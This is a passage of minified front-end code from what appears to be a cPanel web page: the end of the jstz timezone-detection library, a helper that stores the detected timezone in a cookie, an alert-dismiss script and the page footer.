Date(2011,3,5,8,0,0,0),"America/Havana":new Date(2012,2,10,2,0,0,0),"America/New_York":new Date(2012,2,10,7,0,0,0),"Asia/Beirut":new Date(2011,2,27,1,0,0,0),"Europe/Helsinki":new Date(2011,2,27,4,0,0,0),"Europe/Istanbul":new Date(2011,2,28,5,0,0,0),"Asia/Damascus":new Date(2011,3,1,2,0,0,0),"Asia/Jerusalem":new Date(2011,3,1,6,0,0,0),"Asia/Gaza":new Date(2009,2,28,0,30,0,0),"Africa/Cairo":new Date(2009,3,25,0,30,0,0),"Pacific/Auckland":new Date(2011,8,26,7,0,0,0),"Pacific/Fiji":new Date(2010,11,29,23,0,0,0),"America/Halifax":new Date(2011,2,13,6,0,0,0),"America/Goose_Bay":new Date(2011,2,13,2,1,0,0),"America/Miquelon":new Date(2011,2,13,5,0,0,0),"America/Godthab":new Date(2011,2,27,1,0,0,0),"Europe/Moscow":t,"Asia/Yekaterinburg":t,"Asia/Omsk":t,"Asia/Krasnoyarsk":t,"Asia/Irkutsk":t,"Asia/Yakutsk":t,"Asia/Vladivostok":t,"Asia/Kamchatka":t,"Europe/Minsk":t,"Australia/Perth":new Date(2008,10,1,1,0,0,0)};return n[e]};return{determine:a,date_is_dst:o,dst_start_for:f}}();t.TimeZone=function(e){"use strict";var n={"America/Denver":["America/Denver","America/Mazatlan"],"America/Chicago":["America/Chicago","America/Mexico_City"],"America/Santiago":["America/Santiago","America/Asuncion","America/Campo_Grande"],"America/Montevideo":["America/Montevideo","America/Sao_Paulo"],"Asia/Beirut":["Asia/Beirut","Europe/Helsinki","Europe/Istanbul","Asia/Damascus","Asia/Jerusalem","Asia/Gaza"],"Pacific/Auckland":["Pacific/Auckland","Pacific/Fiji"],"America/Los_Angeles":["America/Los_Angeles","America/Santa_Isabel"],"America/New_York":["America/Havana","America/New_York"],"America/Halifax":["America/Goose_Bay","America/Halifax"],"America/Godthab":["America/Miquelon","America/Godthab"],"Asia/Dubai":["Europe/Moscow"],"Asia/Dhaka":["Asia/Yekaterinburg"],"Asia/Jakarta":["Asia/Omsk"],"Asia/Shanghai":["Asia/Krasnoyarsk","Australia/Perth"],"Asia/Tokyo":["Asia/Irkutsk"],"Australia/Brisbane":["Asia/Yakutsk"],"Pacific/Noumea":["Asia/Vladivostok"],"Pacific/Tarawa":["Asia/Kamchatka"],"Africa/Johannesburg":["Asia/Gaza","Africa/Cairo"],"Asia/Baghdad":["Europe/Minsk"]},r=e,i=function(){var e=n[r],i=e.length,s=0,o=e[0];for(;s<i;s+=1){o=e[s];if(t.date_is_dst(t.dst_start_for(o))){r=o;return}}},s=function(){return typeof n[r]!="undefined"};return s()&&i(),{name:function(){return r}}},t.olson={},t.olson.timezones={"-720,0":"Etc/GMT+12","-660,0":"Pacific/Pago_Pago","-600,1":"America/Adak","-600,0":"Pacific/Honolulu","-570,0":"Pacific/Marquesas","-540,0":"Pacific/Gambier","-540,1":"America/Anchorage","-480,1":"America/Los_Angeles","-480,0":"Pacific/Pitcairn","-420,0":"America/Phoenix","-420,1":"America/Denver","-360,0":"America/Guatemala","-360,1":"America/Chicago","-360,1,s":"Pacific/Easter","-300,0":"America/Bogota","-300,1":"America/New_York","-270,0":"America/Caracas","-240,1":"America/Halifax","-240,0":"America/Santo_Domingo","-240,1,s":"America/Santiago","-210,1":"America/St_Johns","-180,1":"America/Godthab","-180,0":"America/Argentina/Buenos_Aires","-180,1,s":"America/Montevideo","-120,0":"Etc/GMT+2","-120,1":"Etc/GMT+2","-60,1":"Atlantic/Azores","-60,0":"Atlantic/Cape_Verde","0,0":"Etc/UTC","0,1":"Europe/London","60,1":"Europe/Berlin","60,0":"Africa/Lagos","60,1,s":"Africa/Windhoek","120,1":"Asia/Beirut","120,0":"Africa/Johannesburg","180,0":"Asia/Baghdad","180,1":"Europe/Moscow","210,1":"Asia/Tehran","240,0":"Asia/Dubai","240,1":"Asia/Baku","270,0":"Asia/Kabul","300,1":"Asia/Yekaterinburg","300,0":"Asia/Karachi","330,0":"Asia/Kolkata","345,0":"Asia/Kathmandu","360,0":"Asia/Dhaka","360,1":"Asia/Omsk","390,0":"Asia/Rangoon","420,1":"Asia/Krasnoyarsk","420,0":"Asia/Jakarta","480,0":"Asia/Shanghai","480,1":"Asia/Irkutsk","525,0":"Australia/Eucla","525,1,s":"Australia/Eucla","540,1":"Asia/Yakutsk","540,0":"Asia/Tokyo","570,0":"Australia/Darwin","570,1,s":"Australia/Adelaide","600,0":"Australia/Brisbane","600,1":"Asia/Vladivostok","600,1,s":"Australia/Sydney","630,1,s":"Australia/Lord_Howe","660,1":"Asia/Kamchatka","660,0":"Pacific/Noumea","690,0":"Pacific/Norfolk","720,1,s":"Pacific/Auckland","720,0":"Pacific/Tarawa","765,1,s":"Pacific/Chatham","780,0":"Pacific/Tongatapu","780,1,s":"Pacific/Apia","840,0":"Pacific/Kiritimati"},typeof exports!="undefined"?exports.jstz=t:e.jstz=t})(this);
+//cptimezone_optimized.js
+(function(window){"use strict";var JSTZ_RELATIVE_PATH="sharedjs/jstz.min.js";var TIMEZONE_COOKIE="timezone";var COOKIE_TIMEZONE_MISMATCH_CLASS="if-timezone-cookie-needs-update";var DETECTED_TZ_CLASS="detected-timezone";var SHOWN_CLASS="shown";function _get_cookie(sKey){return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*"+encodeURIComponent(sKey).replace(/[\-\.\+\*]/g,"\\$&")+"\\s*\\=\\s*([^;]*).*$)|^.*$"),"$1"))||null}function _detect_timezone(){return window.jstz.determine().name()}function reset_timezone_and_reload(){return reset_timezone(location.reload.bind(location))}function _set_cookie(callback){document.cookie=TIMEZONE_COOKIE+"="+_detect_timezone()+"; path=/";if(callback){callback()}}function set_timezone_if_unset(on_success){return!_get_cookie(TIMEZONE_COOKIE)&&reset_timezone(on_success)}function reset_timezone(on_success){_set_cookie(on_success);return true}function set_timezone_and_reload_if_unset(){return set_timezone_if_unset(location.reload.bind(location))}function show_cookie_timezone_mismatch_nodes(){var detected_tz=_detect_timezone();if(detected_tz!==_get_cookie(TIMEZONE_COOKIE)){var detected_nodes=document.querySelectorAll("."+DETECTED_TZ_CLASS);[].forEach.call(detected_nodes,function(n){n.textContent=detected_tz});var show_nodes=document.querySelectorAll("."+COOKIE_TIMEZONE_MISMATCH_CLASS);[].forEach.call(show_nodes,function(n){n.className+=" "+SHOWN_CLASS})}}window.CPTimezone={show_cookie_timezone_mismatch_nodes:show_cookie_timezone_mismatch_nodes,reset_timezone_and_reload:reset_timezone_and_reload,reset_timezone:reset_timezone,set_timezone_and_reload_if_unset:set_timezone_and_reload_if_unset}})(window);
+
+//utils.js
+!function(){function e(){this.closest(".alert").style.visibility="hidden"}document.querySelectorAll(".alert__close").forEach(function(t){t.addEventListener("click",e)})}();
+
+
+CPTimezone.reset_timezone();
+   </script>
+   <style>
+    @media (min-width: 481px) {
+        #select_user_form {
+            width: px;
+        }
+    }
+   </style>
+   <div class="copyright">
+    Copyright© 2021 cPanel, Inc.
+   </div>
+  </div>
+ </body>
+</html>
